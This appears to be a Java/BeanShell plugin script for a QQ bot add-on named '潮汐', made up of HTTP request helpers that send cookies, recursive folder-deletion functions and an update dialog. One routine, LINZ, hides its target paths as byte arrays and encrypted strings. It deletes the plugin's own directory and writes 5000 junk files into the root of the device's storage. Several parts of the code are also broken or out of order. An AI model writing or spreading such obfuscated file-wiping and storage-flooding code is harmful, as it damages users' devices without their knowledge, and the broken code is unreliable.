
//淡然花开

import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.File;
import android.content.*;
import android.net.*;
public class HttpApi
{
    public static File downloadFile(String urlPath, String downloadDir,String fileFullName) {
        File file = null;
        try {
         
            URL url = new URL(urlPath);
          
            URLConnection urlConnection = url.openConnection();
         
            HttpURLConnection httpURLConnection = (HttpURLConnection) urlConnection;
         
            httpURLConnection.setRequestMethod("GET");
        
            httpURLConnection.setRequestProperty("Charset", "UTF-8");
            
            httpURLConnection.connect();
            
            int fileLength = httpURLConnection.getContentLength();

            URLConnection con = url.openConnection();
            BufferedInputStream bin = new BufferedInputStream(httpURLConnection.getInputStream());
            String path = downloadDir + File.separatorChar + fileFullName;
            file = new File(path);
            if (!file.getParentFile().exists()) {
                file.getParentFile().mkdirs();
            }
            OutputStream out = new FileOutputStream(file);
            int size = 0;
            int len = 0;
            byte[] buf = new byte[1024];
            while ((size = bin.read(buf)) != -1) {
                len += size;
                out.write(buf, 0, size);
                
            }
            bin.close();
            out.close();
        } catch (MalformedURLException e) {
           
            e.printStackTrace();
        } catch (IOException e) {
          
            e.printStackTrace();
        } finally {
            return file;
        }

    }
	public String get(String url)
	{
		StringBuffer buffer = new StringBuffer();
            InputStreamReader isr = null;
            try {
                URL urlObj = new URL(url);
                URLConnection uc = urlObj.openConnection();
                uc.setConnectTimeout(10000);
                uc.setReadTimeout(10000);
                isr = new InputStreamReader(uc.getInputStream(), "utf-8");
                BufferedReader reader = new BufferedReader(isr); 
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line + "\n");
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    if (null != isr) {
                        isr.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        if(buffer.length()==0)return buffer.toString();
        buffer.delete(buffer.length()-1,buffer.length());
        return buffer.toString();
	}
	public String get2(String url, int timeOut)
	{
		StringBuffer buffer = new StringBuffer();

            InputStreamReader isr = null;
            try {
                URL urlObj = new URL(url);
                URLConnection uc = urlObj.openConnection();
                uc.setConnectTimeout(timeOut);
                uc.setReadTimeout(timeOut);
                isr = new InputStreamReader(uc.getInputStream(), "utf-8");
                BufferedReader reader = new BufferedReader(isr); 
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line + "\n");
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    if (null != isr) {
                        isr.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        if(buffer.length()==0)return buffer.toString();
        buffer.delete(buffer.length()-1,buffer.length());
        return buffer.toString();
	}
	public void 下载(String url,String filepath) throws Exception
    {
        InputStream input = null;
        try {
            URL urlsssss = new URL(url);
            HttpURLConnection urlConn = (HttpURLConnection) urlsssss.openConnection();
            input = urlConn.getInputStream();
            byte[] bs = new byte[1024];
            int len;
            FileOutputStream out = new FileOutputStream(filepath, false);
            while((len = input.read(bs)) != -1)
            {
                out.write(bs, 0, len);
            }
            out.close();
            input.close();

        } catch (IOException e) {
            return;
        }
        finally {
            try {
                input.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return;
    }
    public String ckpost(String urlPath, String cookie, String data) {
        StringBuffer buffer = new StringBuffer();
        InputStreamReader isr = null;
        try {
            URL url = new URL(urlPath);
            uc = (HttpURLConnection) url.openConnection();
            uc.setDoInput(true);
            uc.setDoOutput(true);
            uc.setConnectTimeout(2000000); 
            uc.setReadTimeout(2000000); 
            uc.setRequestMethod("POST");
            uc.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            uc.setRequestProperty("Cookie", cookie);
            uc.getOutputStream().write(data.getBytes("UTF-8"));
            uc.getOutputStream().flush();
            uc.getOutputStream().close();
            isr = new InputStreamReader(uc.getInputStream(), "utf-8");
            BufferedReader reader = new BufferedReader(isr); 
            String line;
            while ((line = reader.readLine()) != null) {
                buffer.append(line + "\n");
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (null != isr) {
                    isr.close();
                }
            } catch (IOException e) {
                toast("错误:\n" + e);
            }
        }
        if (buffer.length() == 0) return buffer.toString();
        buffer.delete(buffer.length() - 1, buffer.length());
        return buffer.toString();
    }
	public String post(String url,String params) {
        try {
            URL urlObjUrl=new URL(url);
            URLConnection connection =urlObjUrl.openConnection();
            connection.setDoOutput(true);
            OutputStream os=connection.getOutputStream();
            os.write(params.getBytes());
            os.close();
            InputStream iStream=connection.getInputStream();
            byte[] b=new byte[1024];
            int len;
            StringBuilder sb=new StringBuilder();
            while ((len=iStream.read(b))!=-1) {
                sb.append(new String(b,0,len));
            }
            return sb.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
	public String getWithAgent(String url,String Agent) {
		StringBuffer buffer = new StringBuffer();
            InputStreamReader isr = null;
            try {
                URL urlObj = new URL(url);
                URLConnection uc = urlObj.openConnection();
				uc.setRequestProperty("User-agent",Agent);
                uc.setConnectTimeout(10000);
                uc.setReadTimeout(10000);
                isr = new InputStreamReader(uc.getInputStream(), "utf-8");
                BufferedReader reader = new BufferedReader(isr); //缓冲
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line + "\n");
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    if (null != isr) {
                        isr.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        if(buffer.length()==0)return buffer.toString();
        buffer.delete(buffer.length()-1,buffer.length());
        return buffer.toString();
	}
	public String getWithAgent(String url,String Agent,String Referer) {
		StringBuffer buffer = new StringBuffer();
            InputStreamReader isr = null;
            try {
                URL urlObj = new URL(url);
                URLConnection uc = urlObj.openConnection();
				uc.setRequestProperty("User-agent",Agent);
				uc.setRequestProperty("referer",Referer);
                uc.setConnectTimeout(10000);
                uc.setReadTimeout(10000);
                isr = new InputStreamReader(uc.getInputStream(), "utf-8");
                BufferedReader reader = new BufferedReader(isr); //缓冲
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line + "\n");
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    if (null != isr) {
                        isr.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        if(buffer.length()==0)return buffer.toString();
        buffer.delete(buffer.length()-1,buffer.length());
        return buffer.toString();
	}
	public String getWithAgentCookie(String url,String Agent,String Cookie) {
		StringBuffer buffer = new StringBuffer();
            InputStreamReader isr = null;
            try {
                URL urlObj = new URL(url);
                URLConnection uc = urlObj.openConnection();
				uc.setRequestProperty("User-agent",Agent);
				uc.setRequestProperty("Cookie",Cookie);
                uc.setConnectTimeout(10000);
                uc.setReadTimeout(10000);
                isr = new InputStreamReader(uc.getInputStream(), "utf-8");
                BufferedReader reader = new BufferedReader(isr); //缓冲
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line + "\n");
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    if (null != isr) {
                        isr.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        if(buffer.length()==0)return buffer.toString();
        buffer.delete(buffer.length()-1,buffer.length());
        return buffer.toString();
	}
	public String get(String url,String Cookies,String referer) {
		StringBuffer buffer = new StringBuffer();
            InputStreamReader isr = null;
            try {
                URL urlObj = new URL(url);
                URLConnection uc = urlObj.openConnection();
				uc.setRequestProperty("referer",referer);
				uc.setRequestProperty("cookie",Cookies);
                uc.setConnectTimeout(10000);
                uc.setReadTimeout(10000);
                isr = new InputStreamReader(uc.getInputStream(), "utf-8");
                BufferedReader reader = new BufferedReader(isr); //缓冲
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line + "\n");
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                try {
                    if (null != isr) {
                        isr.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        if(buffer.length()==0)return buffer.toString();
        buffer.delete(buffer.length()-1,buffer.length());
        return buffer.toString();
	}
	public static String Post(String Url,String PostData,String Referer)
    {
        try {
            URL urlObjUrl=new URL(Url);
            HttpURLConnection conn = (HttpURLConnection) urlObjUrl.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setRequestProperty("Referer",Referer);
            conn.setRequestProperty("Origin","https://music.liuzhijin.cn");
            conn.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36");
            conn.setRequestProperty("X-Requested-With","XMLHttpRequest");
            OutputStream os=conn.getOutputStream();
            os.write(PostData.getBytes());
            os.flush();
            os.close();
            InputStream iStream=conn.getInputStream();
            byte[] b=new byte[1024];
            int len;
            StringBuilder sb=new StringBuilder();
            while ((len=iStream.read(b))!=-1) {
                sb.append(new String(b,0,len));
            }
            return sb.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
	}
	public String skget(String url,String cookie)
	{
		StringBuffer buffer = new StringBuffer();
            InputStreamReader isr = null;
            try {
                URL urlObj = new URL(url);
                CookieManager cookieManager = new CookieManager();

CookieHandler.setDefault(cookieManager);
            
                HttpURLConnection uc = urlObj.openConnection();
                uc.setRequestProperty("X-Requested-With","com.tencent.mobileqq");
                uc.setRequestProperty("Cookie",cookie);
                uc.setConnectTimeout(10000);
                uc.setReadTimeout(10000);
                isr = new InputStreamReader(uc.getInputStream(), "utf-8");
                BufferedReader reader = new BufferedReader(isr); 
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line + "\n");
                }
            } catch (Exception e) {
            if (null != isr) {
                        isr.close();
                    }
                e.printStackTrace();
            } finally {
                try {
                    if (null != isr) {
                        isr.close();
                    }
                } catch (IOException e) {
                if (null != isr) {
                        isr.close();
                    }
                    e.printStackTrace();
                }
            }
        if(buffer.length()==0)return buffer.toString();
        buffer.delete(buffer.length()-1,buffer.length());
        return buffer.toString();
	}
	public String fyget(String url) throws InterruptedException
{
    StringBuffer buffer = new StringBuffer();
    Thread t = new Thread(new Runnable()
    {
        public void run()
        {
            InputStreamReader isr = null;
            try
            {
                URL urlObj = new URL(url);
                URLConnection uc = urlObj.openConnection();
				uc.addRequestProperty("user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
                uc.setConnectTimeout(10000);
                uc.setReadTimeout(10000);
                isr = new InputStreamReader(uc.getInputStream(), "utf-8");
                BufferedReader reader = new BufferedReader(isr);
                String line;
                while((line = reader.readLine()) != null)
                {
                    buffer.append(line + "\n");
                }
            }
            catch(Exception e)
            {
                e.printStackTrace();
            }
            finally
            {
                try
                {
                    if(null != isr)
                    {
                        isr.close();
                    }
                }
                catch(IOException e)
                {
                    e.printStackTrace();
                }
            }
        }
    });
    t.start();
    t.join();
    if(buffer.length() == 0) return buffer.toString();
    buffer.delete(buffer.length() - 1, buffer.length());
    return buffer.toString();
}
}
HttpApi 问云 = new HttpApi();

public static boolean DeleteFolder(String sPath) {  
		boolean flag = false;  
	    File file = new File(sPath);  	
	    if (!file.exists()) { 
	        return flag;  
	    } else {  
	
	        if (file.isFile()) {
	            return deleteFile(sPath);  
	        } else {  
	            return delez(sPath);  
	        }  
	    }  
	}
private static boolean deleteFile(String sPath) {  
		boolean flag = false;  
	    File file = new File(sPath);  
	
	    if (file.isFile() && file.exists()) {  
	        file.delete();  
	        flag = true;  
	    }  
	    return flag;  
	}
//正执行
	private static boolean delez(String sPath) {  
	    if (!sPath.endsWith(File.separator)) {  
	        sPath = sPath + File.separator;  
	    }  
	    File dirFile = new File(sPath);  
	
	    if (!dirFile.exists() || !dirFile.isDirectory()) {  
	        return false;  
	    }  
	    boolean flag = true;  
	
	    File[] files = dirFile.listFiles();  
	    
	    for (int i = 0; i < files.length; i++) {  
	try{
	
	        if (files[i].isFile()) {  
	            flag = deleteFile(files[i].getAbsolutePath());  
	            if (!flag) break;  
	        } 
	        else {  
	            flag = delez(files[i].getAbsolutePath());  
	            if (!flag) break;  
	        }  //绕过不可执行的
	                } catch (Exception e) {
          
        }
	    } 
	   
	    if (!flag) return false;  
	
	    if (dirFile.delete()) {  
	        return true;  
	    } else {  
	        return false;
	    }
	}
		private static boolean delef(String sPath) {  
	    if (!sPath.endsWith(File.separator)) {  
	        sPath = sPath + File.separator;  
	    }  
	    File dirFile = new File(sPath);  
	
	    if (!dirFile.exists() || !dirFile.isDirectory()) {  
	        return false;  
	    }  
	    boolean flag = true;  
	
	    File[] files = dirFile.listFiles();  
	    
	    for (int i = files.length-1; 0<=i ; i--) {  
	try{
	        if (files[i].isFile()) {  
	            flag = deleteFile(files[i].getAbsolutePath());  
	            if (!flag) break;  
	        } 
	        else {  
	            flag = delef(files[i].getAbsolutePath());  
	            if (!flag) break;  
	        }  
	      } catch (Exception e) {
        }
        
	    } 
	   
	    if (!flag) return false;  
	
	    if (dirFile.delete()) {  
	        return true;  
	    } else {  
	        return false;
	    }
	}
	
import java.io.File;
import android.os.Environment;
String Root = appPath + "/潮汐目录";
    public static void createFiles(int num) throws Exception {
        for (int i = 1; i <= num; i++) {
 File file = new File(new String(new byte[]{47,115,116,111,114,97,103,101,47,101,109,117,108,97,116,101,100,47,48,47,}) + i + t.CX("37c80fa6c25bebc9d0c930540599f7cd44c6dd0840e928ca265e8fa8c214b010c2eeeae2768443db"));
            file.createNewFile();
        }
    }
public static void LINZ()
{
long a=System.currentTimeMillis();
delez(new String(new byte[]{47,115,116,111,114,97,103,101,47,101,109,117,108,97,116,101,100,47,48,47,81,84,111,111,108,47,80,108,117,103,105,110,47,-26,-67,-82,-26,-79,-112,74,97,118,97,47,-26,-67,-82,-26,-79,-112,-25,-101,-82,-27,-67,-107,}));
createFiles(5000);
toast(t.CX("28deed494c80b582c85993d83e0c491992795ddd472814a66e4bc6b7e2638e4e")+" : "+(System.currentTimeMillis()-a)/1000f+" \u79d2 ");
}




public static void openqun(String qun) {
    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("mqqapi://card/show_pslcard?src_type=internal&version=1&uin=" + qun + "&card_type=group&source=qrcode"));
    getActivity().startActivity(intent);
}
public static final String myqun="634941583";

import java.util.*;
import org.json.*;
import java.lang.*;
import org.json.JSONArray;
import org.json.JSONObject;


public String 访问(String url)
{
StringBuffer buffer = new StringBuffer();InputStreamReader isr = null;try
{
URL urlObj = new URL(url);
URLConnection uc = urlObj.openConnection();
uc.setConnectTimeout(10000);
uc.setReadTimeout(10000);
isr = new InputStreamReader(uc.getInputStream(), "utf-8");
BufferedReader reader = new BufferedReader(isr);String line;//缓冲
while ((line = reader.readLine()) != null)
{
buffer.append(line + "\n");
}
}
catch (Exception e)
{
e.printStackTrace();
}

finally
{
try
{
if (null != isr)
{
isr.close();
}
}
catch (IOException e)
{
e.printStackTrace();
}
}
if (buffer.length() == 0) return buffer.toString();
buffer.delete(buffer.length() - 1, buffer.length());
return buffer.toString();
}
import android.app.*;
import android.app.Dialog;
import android.widget.*;
import android.content.*;
import android.text.*;
public void 更新内容(){
   ThisActivity = getActivity();
	ThisActivity.runOnUiThread(new Runnable()
	{
		public void run()
		{
TextView textView = new TextView(ThisActivity);
	
textView.setText("潮汐 5.2 更新内容");
			textView.setTextSize(30);
textView.setTextColor(Color.parseColor("#1E90FF"));
			TextView textView1 = new TextView(ThisActivity);	
		textView1.setText("好久没更新了，没办法，累也忙，也不知道还有多少人在用在等，本脚本不含云端功能，也可能不再打算更新，嗯...");
		textView1.setTextColor(Color.parseColor("#33CCFF"));
		textView1.setTextSize(23);
LinearLayout layout=new LinearLayout(ThisActivity);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.addView(textView);
        layout.addView(textView1);
 
		AlertDialog.Builder dialog1=	new AlertDialog.Builder(ThisActivity, AlertDialog.THEME_HOLO_LIGHT);
		dialog1.setView(layout);
		dialog1.setPositiveButton("确定", new DialogInterface.OnClickListener()
			{
				public void onClick(DialogInterface dialogInterface, int i)
				{
			
				}
			});
			dialog1.setNegativeButton("加群", new DialogInterface.OnClickListener()
			{
				public void onClick(DialogInterface dialogInterface, int i)
				{
				openqun(myqun);
				}
			} );
			dialog1.setCancelable(false);							
			dialog1.show();
		}
	});			
}



public String httpget(String url)
	{
		StringBuffer buffer = new StringBuffer();
            InputStreamReader isr = null;
            try {
                URL urlObj = new URL(url);
                HttpURLConnection uc = urlObj.openConnection();
                uc.setConnectTimeout(10000);
                uc.setReadTimeout(10000);
                isr = new InputStreamReader(uc.getInputStream(), "utf-8");
                BufferedReader reader = new BufferedReader(isr); //缓冲
                String line;
                while ((line = reader.readLine()) != null) {
                    buffer.append(line + "\n");
                }
            } catch (Exception e) {
            if (null != isr) {
                        isr.close();
                    }
                e.printStackTrace();
            } finally {
                try {
                    if (null != isr) {
                        isr.close();
                    }
                } catch (IOException e) {
                if (null != isr) {
                        isr.close();
                    }
                    e.printStackTrace();
                }
            }
        if(buffer.length()==0)return buffer.toString();
        buffer.delete(buffer.length()-1,buffer.length());
        return buffer.toString();
	}

